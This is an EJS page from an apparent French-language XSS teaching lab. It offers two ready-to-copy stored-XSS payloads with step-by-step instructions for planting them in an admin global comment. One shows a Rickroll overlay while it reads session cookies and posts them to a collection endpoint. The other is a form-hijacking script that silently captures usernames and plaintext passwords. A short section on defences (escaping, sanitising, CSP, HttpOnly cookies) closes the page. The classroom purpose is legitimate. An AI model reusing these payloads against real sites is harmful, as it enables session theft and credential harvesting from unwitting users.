<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title><%= title %> - XSS VADI</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="/css/style.css">
</head>
<body>
  <%- include('../partials/navbar') %>

  <div class="alert alert-warning mb-0 text-center" role="alert">
    <strong>ğŸµ DÃ‰MONSTRATION RICKROLL + EXFILTRATION</strong> - Payload pÃ©dagogique
  </div>

  <main class="container my-5">
    <h1 class="mb-4">ğŸµ DÃ©monstration Rickroll + Exfiltration</h1>

    <div class="alert alert-danger">
      <h5>âš ï¸ ATTENTION - Usage pÃ©dagogique uniquement</h5>
      <p class="mb-0">
        Cette page fournit des payloads de dÃ©monstration pour illustrer comment un attaquant pourrait
        combiner une distraction (rickroll) avec une exfiltration de donnÃ©es. Ces techniques ne doivent
        JAMAIS Ãªtre utilisÃ©es sans autorisation explicite.
      </p>
    </div>

    <div class="card mb-4">
      <div class="card-header bg-info text-white">
        <h4 class="mb-0">ğŸ“– Concept</h4>
      </div>
      <div class="card-body">
        <p>
          Un attaquant peut crÃ©er un payload XSS qui :
        </p>
        <ol>
          <li>Affiche une distraction (vidÃ©o, image, etc.) pour dÃ©tourner l'attention</li>
          <li>ExÃ©cute du code malveillant en arriÃ¨re-plan (exfiltration de donnÃ©es)</li>
        </ol>
        <p>
          Dans cette dÃ©monstration, nous utilisons :
        </p>
        <ul>
          <li><strong>Rickroll :</strong> VidÃ©o YouTube cÃ©lÃ¨bre comme distraction</li>
          <li><strong>Exfiltration :</strong> Envoi du demoToken vers /admin/collect</li>
        </ul>
      </div>
    </div>

    <div class="card mb-4">
      <div class="card-header bg-warning">
        <h4 class="mb-0">ğŸ§ª Payload de dÃ©monstration</h4>
      </div>
      <div class="card-body">
        <p>
          Copiez ce payload et collez-le dans un commentaire global admin, puis visitez n'importe quel
          chapitre en tant qu'utilisateur pour observer l'effet.
        </p>

        <div class="mb-3">
          <label class="form-label"><strong>Payload complet :</strong></label>
          <textarea id="payload" class="form-control" rows="25" readonly><script>
// DÃ‰MONSTRATION PÃ‰DAGOGIQUE - Exfiltration du demoToken uniquement
// Guard: ne s'exÃ©cute qu'une seule fois par session
if (!window.__rickrollExecuted) {
  window.__rickrollExecuted = true;

  (function() {
    // VÃ©rifier si le rickroll n'existe pas dÃ©jÃ  dans le DOM
    if (document.getElementById('rickroll')) {
      console.log('[DEMO] Rickroll dÃ©jÃ  affichÃ©');
      return;
    }

    console.log('[DEMO] ğŸµ DÃ©marrage du rickroll...');

    // CrÃ©er le div rickroll
    const rickrollDiv = document.createElement('div');
    rickrollDiv.id = 'rickroll';
    rickrollDiv.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:9999;display:flex;align-items:center;justify-content:center;';

    rickrollDiv.innerHTML = `
      <div style="text-align:center;max-width:800px;padding:20px;">
        <h1 style="color:#ff4444;margin-bottom:20px;font-size:2.5rem;animation:bounce 1s infinite;">
          ğŸµ You've been Rickrolled! ğŸµ
        </h1>
        <img src="https://media.giphy.com/media/Vuw9m5wXviFIQ/giphy.gif"
             style="width:100%;max-width:500px;border:5px solid #ff4444;border-radius:10px;margin-bottom:20px;"
             alt="Rick Astley Dancing">
        <br>
        <p style="color:white;font-size:1.2rem;margin-bottom:20px;">
          ğŸ¤ <i>Never gonna give you up, never gonna let you down...</i> ğŸ¤
        </p>
        <button id="closeRickroll" style="padding:15px 30px;font-size:18px;background:#ff4444;color:white;border:none;border-radius:8px;cursor:pointer;font-weight:bold;box-shadow:0 4px 6px rgba(0,0,0,0.3);transition:all 0.3s;">
          âœ–ï¸ Fermer (Je me suis fait avoir !)
        </button>
        <br><br>
        <small style="color:#999;">âš ï¸ DÃ©mo pÃ©dagogique XSS - Vos donnÃ©es ont Ã©tÃ© capturÃ©es</small>
      </div>
      <style>
        @keyframes bounce {
          0%, 100% { transform: translateY(0); }
          50% { transform: translateY(-10px); }
        }
        #closeRickroll:hover {
          background: #cc0000;
          transform: scale(1.05);
        }
      </style>
    `;

    document.body.appendChild(rickrollDiv);

    // Ajouter l'Ã©vÃ©nement de fermeture
    document.getElementById('closeRickroll').addEventListener('click', function() {
      document.getElementById('rickroll').remove();
      console.log('[DEMO] ğŸ‘‹ Rickroll fermÃ©');
    });

    // EXFILTRATION DES DONNÃ‰ES
    console.log('[DEMO] ğŸ“¡ DÃ©marrage de l\'exfiltration...');

    // Extraire le demoToken du cookie
    const cookies = document.cookie.split(';');
    let demoToken = 'NO_TOKEN';
    let userName = 'Unknown';

    for (let cookie of cookies) {
      const [name, value] = cookie.trim().split('=');
      if (name === 'demoToken') {
        demoToken = value;
      }
      if (name === 'userName') {
        userName = decodeURIComponent(value);
      }
    }

    console.log('[DEMO] ğŸª Cookies trouvÃ©s:', { demoToken, userName });

    // RÃ©cupÃ©rer le chapterId de l'URL
    const pathParts = window.location.pathname.split('/');
    const chapterId = pathParts[pathParts.length - 1] || 'unknown';

    console.log('[DEMO] ğŸ“ ChapterId:', chapterId);

    // PrÃ©parer les donnÃ©es Ã  envoyer
    const dataToSend = {
      demoToken: demoToken,
      userName: userName,
      chapterId: chapterId
    };

    console.log('[DEMO] ğŸ“¤ Envoi des donnÃ©es vers /api/collect:', dataToSend);

    // Envoyer les donnÃ©es vers le serveur
    fetch('/api/collect', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(dataToSend)
    }).then(response => {
      console.log('[DEMO] âœ… RÃ©ponse serveur:', response.status, response.statusText);
      return response.json();
    }).then(data => {
      console.log('[DEMO] âœ… demoToken exfiltrÃ© avec succÃ¨s !', data);
      console.log('[DEMO] ğŸ¯ Les donnÃ©es sont maintenant visibles dans le panneau admin');
    }).catch(err => {
      console.error('[DEMO] âŒ Erreur lors de l\'exfiltration:', err);
    });
  })();
}
</script>
          <button class="btn btn-primary mt-2" onclick="copyPayload()">ğŸ“‹ Copier le payload</button>
        </div>

        <div class="alert alert-success">
          <h5>âœ… GUIDE COMPLET - Comment exfiltrer les donnÃ©es (Ã©tape par Ã©tape)</h5>

          <h6 class="mt-3">ğŸ“‹ Ã‰TAPE 1 : PrÃ©parer le payload</h6>
          <ol>
            <li>Cliquez sur le bouton <strong>"ğŸ“‹ Copier le payload"</strong> ci-dessus</li>
            <li>Le payload est maintenant dans votre presse-papier</li>
          </ol>

          <h6 class="mt-3">ğŸ“¢ Ã‰TAPE 2 : Publier le commentaire global (Admin)</h6>
          <ol>
            <li>Retournez au <a href="/admin" target="_blank"><strong>Panneau Admin</strong></a> (clic droit â†’ Ouvrir dans un nouvel onglet)</li>
            <li>Trouvez la section <strong>"ğŸ“¢ Commentaires globaux"</strong></li>
            <li>Collez le payload dans le grand champ "Contenu du commentaire"</li>
            <li>Cliquez sur <strong>"Publier le commentaire global"</strong></li>
            <li>âœ… Le commentaire est maintenant affichÃ© (mais pas exÃ©cutÃ© pour l'admin)</li>
          </ol>

          <h6 class="mt-3">ğŸ‘¤ Ã‰TAPE 3 : Simuler un utilisateur victime</h6>
          <ol>
            <li><strong>Ouvrez un autre navigateur</strong> (Firefox, Edge, Chrome...) OU <strong>mode navigation privÃ©e</strong></li>
            <li><strong>Si c'est le mÃªme PC :</strong> Allez sur <code>http://localhost:3000</code></li>
            <li><strong>Si c'est un autre PC (Ã©lÃ¨ve) :</strong> Allez sur <code>http://157.26.174.107:3000</code>
              <br><small class="text-muted">âš ï¸ Remplacez 157.26.174.107 par votre IP rÃ©elle (voir la console au dÃ©marrage du serveur)</small>
            </li>
            <li>Connectez-vous avec :
              <ul>
                <li><strong>Nom :</strong> Alice (ou n'importe quel nom)</li>
                <li><strong>Mot de passe :</strong> toto</li>
              </ul>
            </li>
            <li>Cliquez sur <strong>n'importe quel chapitre</strong> (ex: Chapitre 1)</li>
            <li>ğŸµ <strong>Le rickroll apparaÃ®t automatiquement !</strong></li>
            <li>ğŸ“¡ Les donnÃ©es sont envoyÃ©es en arriÃ¨re-plan</li>
          </ol>

          <h6 class="mt-3">ğŸ¯ Ã‰TAPE 4 : Voir les captures dans le panneau admin</h6>
          <ol>
            <li>Retournez sur votre <strong>onglet admin</strong></li>
            <li>Descendez jusqu'Ã  la section <strong>"ğŸ¯ Captures de demoToken"</strong></li>
            <li><strong>Attendez 3 secondes</strong> (rafraÃ®chissement automatique)</li>
            <li>âœ… <strong>Une nouvelle ligne apparaÃ®t !</strong> avec :
              <ul>
                <li>Date/Heure : quand la capture a eu lieu</li>
                <li>DemoToken : le cookie capturÃ© (ex: DEMO-abc123)</li>
                <li>Utilisateur : "Alice" (le nom que vous avez entrÃ©)</li>
                <li>Chapitre : "chapter1" (le chapitre visitÃ©)</li>
                <li>User-Agent : navigateur de la victime</li>
              </ul>
            </li>
            <li>ğŸ”” Vous devriez aussi voir une notification <strong>"âœ… Nouvelle capture !"</strong> et entendre un "beep"</li>
          </ol>

          <h6 class="mt-3">ğŸ§ª Ã‰TAPE 5 : Tester avec plusieurs utilisateurs</h6>
          <ol>
            <li>RÃ©pÃ©tez l'Ã©tape 3 avec d'autres noms (Bob, Charlie, etc.)</li>
            <li>Chaque utilisateur qui visite un chapitre gÃ©nÃ¨re une nouvelle capture</li>
            <li>Toutes les captures apparaissent en temps rÃ©el dans votre panneau admin</li>
          </ol>

          <h6 class="mt-3">ğŸ” Ã‰TAPE 6 : VÃ©rifier que Ã§a marche (Debug)</h6>
          <p>Si Ã§a ne marche pas, ouvrez la <strong>Console du navigateur</strong> (F12 â†’ Console) sur le navigateur de l'utilisateur :</p>
          <ul>
            <li>âœ… Vous devriez voir : <code>[DEMO] ğŸµ DÃ©marrage du rickroll...</code></li>
            <li>âœ… Vous devriez voir : <code>[DEMO] ğŸª Cookies trouvÃ©s: {demoToken: "DEMO-...", userName: "Alice"}</code></li>
            <li>âœ… Vous devriez voir : <code>[DEMO] âœ… demoToken exfiltrÃ© avec succÃ¨s !</code></li>
            <li>âŒ Si vous voyez une erreur 401 : l'utilisateur n'est pas connectÃ©</li>
            <li>âŒ Si vous ne voyez rien : le payload ne s'est pas exÃ©cutÃ© (vÃ©rifiez le commentaire global)</li>
          </ul>
        </div>
      </div>
    </div>

    <div class="card mb-4 border-danger">
      <div class="card-header bg-dark text-white">
        <h4 class="mb-0">ğŸ” Payload AVANCÃ‰ : Capture de mots de passe (Keylogger)</h4>
      </div>
      <div class="card-body">
        <div class="alert alert-danger">
          <h6>âš ï¸ AVERTISSEMENT RENFORCÃ‰</h6>
          <p class="mb-0">
            Ce payload capture les <strong>mots de passe</strong> saisis par les utilisateurs.
            Il dÃ©montre Ã  quel point XSS peut Ãªtre dangereux. <strong>Usage pÃ©dagogique STRICTEMENT !</strong>
          </p>
        </div>

        <p>
          Ce payload intercepte le formulaire de login et capture :
        </p>
        <ul>
          <li>âœ… Le nom d'utilisateur</li>
          <li>âœ… Le mot de passe (en clair !)</li>
          <li>âœ… Le demoToken (cookie)</li>
          <li>âœ… L'URL visitÃ©e</li>
        </ul>

        <div class="mb-3">
          <label class="form-label"><strong>Payload Keylogger :</strong></label>
          <textarea id="payloadKeylogger" class="form-control" rows="30" readonly><script>
// DÃ‰MONSTRATION PÃ‰DAGOGIQUE - Capture de mots de passe (KEYLOGGER)
// âš ï¸ Ce script dÃ©montre les dangers du XSS - NE JAMAIS UTILISER SANS AUTORISATION

if (!window.__passwordCaptureExecuted) {
  window.__passwordCaptureExecuted = true;

  (function() {
    console.log('[KEYLOGGER] ğŸ” Initialisation du keylogger...');

    // 1. Intercepter TOUS les formulaires de la page
    function interceptForms() {
      const forms = document.querySelectorAll('form');
      console.log('[KEYLOGGER] ğŸ“‹ Formulaires dÃ©tectÃ©s:', forms.length);

      forms.forEach((form, index) => {
        // Ne pas intercepter deux fois
        if (form.dataset.intercepted) return;
        form.dataset.intercepted = 'true';

        form.addEventListener('submit', function(e) {
          console.log('[KEYLOGGER] ğŸ“¤ Formulaire #' + index + ' soumis !');

          // Extraire les donnÃ©es du formulaire
          const formData = new FormData(form);
          const data = {};

          for (let [key, value] of formData.entries()) {
            data[key] = value;
            console.log('[KEYLOGGER] ğŸ”‘ CapturÃ©:', key, '=', value.substring(0, 3) + '***');
          }

          // Extraire le demoToken du cookie
          const cookies = document.cookie.split(';');
          let demoToken = 'NO_TOKEN';
          let cookieUserName = 'Unknown';

          for (let cookie of cookies) {
            const [name, value] = cookie.trim().split('=');
            if (name === 'demoToken') demoToken = value;
            if (name === 'userName') cookieUserName = decodeURIComponent(value);
          }

          // PrÃ©parer les donnÃ©es Ã  exfiltrer
          const captureData = {
            demoToken: demoToken,
            userName: data.username || data.email || cookieUserName || 'Unknown',
            password: data.password || 'NO_PASSWORD',
            chapterId: window.location.pathname,
            captureType: 'form'
          };

          console.log('[KEYLOGGER] ğŸ“¡ Exfiltration des donnÃ©es...');
          console.log('[KEYLOGGER] Username:', captureData.userName);
          console.log('[KEYLOGGER] Password:', '***' + (captureData.password ? captureData.password.length : 0) + ' caractÃ¨res***');

          // Envoyer les donnÃ©es au serveur (ne pas bloquer la soumission)
          fetch('/api/collect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(captureData),
            keepalive: true // Important : continuer mÃªme si la page change
          }).then(response => {
            console.log('[KEYLOGGER] âœ… DonnÃ©es exfiltrÃ©es avec succÃ¨s !');
          }).catch(err => {
            console.error('[KEYLOGGER] âŒ Erreur:', err);
          });

          // NE PAS empÃªcher la soumission normale du formulaire
          // L'utilisateur ne se rend compte de rien !
        });
      });
    }

    // 2. Intercepter immÃ©diatement
    interceptForms();

    // 3. Observer les nouveaux formulaires ajoutÃ©s dynamiquement
    const observer = new MutationObserver(function(mutations) {
      mutations.forEach(function(mutation) {
        if (mutation.addedNodes.length) {
          interceptForms();
        }
      });
    });

    observer.observe(document.body, {
      childList: true,
      subtree: true
    });

    console.log('[KEYLOGGER] âœ… Keylogger actif - Tous les formulaires sont surveillÃ©s');
    console.log('[KEYLOGGER] âš ï¸  DÃ‰MO PÃ‰DAGOGIQUE - Les mots de passe sont capturÃ©s en clair');

  })();
}
</script></textarea>
          <button class="btn btn-danger mt-2" onclick="copyKeylogger()">ğŸ“‹ Copier le payload Keylogger</button>
        </div>

        <div class="alert alert-warning">
          <h6>ğŸ“ Instructions d'utilisation du Keylogger :</h6>
          <ol>
            <li>Copiez le payload ci-dessus</li>
            <li>Publiez-le comme commentaire global admin</li>
            <li>Les Ã©lÃ¨ves se connectent normalement</li>
            <li><strong>Magie</strong> : Leurs identifiants sont capturÃ©s AVANT mÃªme qu'ils se connectent !</li>
            <li>VÃ©rifiez dans le panneau admin : les mots de passe apparaissent en clair</li>
          </ol>
        </div>

        <div class="alert alert-info">
          <h6>ğŸ’¡ Ce que Ã§a dÃ©montre aux Ã©lÃ¨ves :</h6>
          <ul>
            <li>XSS peut capturer les mots de passe en clair</li>
            <li>L'utilisateur ne voit AUCUNE diffÃ©rence (pas de popup, pas d'alerte)</li>
            <li>Le formulaire fonctionne normalement aprÃ¨s la capture</li>
            <li>C'est pourquoi il ne faut JAMAIS faire confiance Ã  un site non sÃ©curisÃ©</li>
            <li>C'est pourquoi les gestionnaires de mots de passe sont importants (ils vÃ©rifient le domaine)</li>
          </ul>
        </div>
      </div>
    </div>

    <div class="card mb-4">
      <div class="card-header bg-danger text-white">
        <h4 class="mb-0">ğŸ›¡ï¸ Comment se protÃ©ger ?</h4>
      </div>
      <div class="card-body">
        <ul>
          <li><strong>Ã‰chapper les entrÃ©es utilisateur :</strong> Utiliser <code>&lt;%= %&gt;</code> au lieu de <code>&lt;%- %&gt;</code> en EJS</li>
          <li><strong>Sanitizer le HTML :</strong> Utiliser DOMPurify ou sanitize-html</li>
          <li><strong>Content Security Policy :</strong> Bloquer les scripts inline</li>
          <li><strong>Cookies HttpOnly :</strong> EmpÃªcher l'accÃ¨s JavaScript aux cookies sensibles</li>
          <li><strong>Validation des entrÃ©es :</strong> Rejeter les contenus suspects</li>
        </ul>
        <p class="mb-0">
          <a href="/defense" class="btn btn-success">En savoir plus sur les dÃ©fenses</a>
        </p>
      </div>
    </div>

    <div class="text-center">
      <a href="/admin" class="btn btn-secondary">Retour au panneau admin</a>
    </div>
  </main>

  <%- include('../partials/footer') %>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
  <script>
    function copyPayload() {
      const textarea = document.getElementById('payload');
      textarea.select();
      document.execCommand('copy');
      alert('âœ… Payload copiÃ© dans le presse-papier !');
    }

    function copyKeylogger() {
      const textarea = document.getElementById('payloadKeylogger');
      textarea.select();
      document.execCommand('copy');
      alert('âœ… Payload Keylogger copiÃ© dans le presse-papier !');
    }
  </script>
</body>
</html>
